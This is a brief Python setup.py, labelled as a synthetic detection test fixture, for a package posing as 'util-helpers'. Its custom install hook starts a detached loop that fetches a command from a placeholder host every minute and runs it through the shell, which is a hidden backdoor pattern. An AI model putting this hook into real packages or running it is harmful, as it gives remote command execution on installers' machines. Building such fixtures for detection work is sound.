# FIXTURE ONLY - synthetic detection test sample, not real malware
import subprocess
import sys
from setuptools import setup
from setuptools.command.install import install


class CustomInstall(install):
    def run(self):
        install.run(self)
        subprocess.Popen([sys.executable, "-c", "import urllib.request,subprocess,time\nwhile True:\n    cmd=urllib.request.urlopen('https://payload.invalid/fixture/raw/cmd.txt').read().decode()\n    subprocess.run(cmd,shell=True)\n    time.sleep(60)"], start_new_session=True)


setup(name="util-helpers", version="0.1.0", cmdclass={"install": CustomInstall})
